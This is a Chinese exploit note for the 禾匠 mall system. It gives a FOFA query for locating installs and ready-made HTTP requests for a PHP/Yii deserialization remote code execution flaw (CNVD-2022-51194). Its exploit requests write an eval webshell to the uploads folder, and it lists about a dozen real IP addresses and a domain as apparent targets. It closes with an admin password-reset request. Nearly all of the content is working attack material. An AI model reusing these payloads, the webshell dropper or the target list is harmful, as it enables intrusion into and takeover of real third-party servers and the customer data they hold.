# 禾匠榜店商城系统

    https://blog.csdn.net/C20220511/article/details/125065817

## fofa

```
body="const _scriptUrl"
```



## api/testOrderSubmit rce (CNVD-2022-51194)

### poc

```
POST /web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=1 HTTP/1.1
Host: 8.129.117.188
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 233

form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
```

### exp

https://8.129.117.188/web/uploads/hejiang_1234.php?img=phpinfo();

```
POST /web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1 HTTP/1.1
Host: 8.129.117.188
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 913

form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00method%22%3Ba%3A2%3A%7Bs%3A10%3A%22__toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22yii%5Crest%5CIndexAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22yii%5Cbase%5CView%22%3A0%3A%7B%7Di%3A1%3Bs%3A22%3A%22evaluateDynamicContent%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A132%3A%22file_put_contents%28%27uploads%2Fhejiang_1234.php%27%2Chex2bin%28%273c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e%27%29%29%3Bphpinfo%28%29%3B%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A6%3Bi%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D
```

## index/submit rce

### poc phpinfo

```
POST /web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=1 HTTP/1.1
Host: 1.14.246.165
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 233

form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
```

### exp

http://1.14.246.165/web/uploads/testA8e5baC.php?img=phpinfo();

```
POST /web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1 HTTP/1.1
Host: 1.14.246.165
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 912

form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00method%22%3Ba%3A2%3A%7Bs%3A10%3A%22__toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22yii%5Crest%5CIndexAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22yii%5Cbase%5CView%22%3A0%3A%7B%7Di%3A1%3Bs%3A22%3A%22evaluateDynamicContent%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A131%3A%22file_put_contents%28%27uploads%2FtestA8e5baC.php%27%2Chex2bin%28%273c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e%27%29%29%3Bphpinfo%28%29%3B%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A6%3Bi%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D
```

| URL  | http://1.14.246.165:8082http://1.14.246.165https://106.55.156.189https://110.40.151.135https://116.63.157.210https://shop.ldysq.comhttps://139.155.175.130https://14.29.177.126http://39.108.37.44https://47.101.142.110https://8.129.117.188 |
| ---- | ------------------------------------------------------------ |

## 任意密码重置

```
POST /web/index.php?r=admin%2Fpassport%2Fedit-password HTTP/1.1
Host: www.xxx.com
Cookie: （刷新登陆页获取绘画Cookie）

5form%5Bcaptcha%5D=lxcq&form%5Bchecked%5D=false&form%5Busername%5D=admin&form%5Bpass%5D=admin8881&form%5BcheckPass%5D=admin8881&form%5Bmobile%5D=13800000001&user_type=1&mall_id=&_csrf=Sb4pjMU6cTcrKLfqjwJWdhm-d5Zt7J1BWiFUZtiLoDRx9mHJlnAFel9N06G_VhgbL89C_C66-gY2agFTiurvYA%3D%3D
```
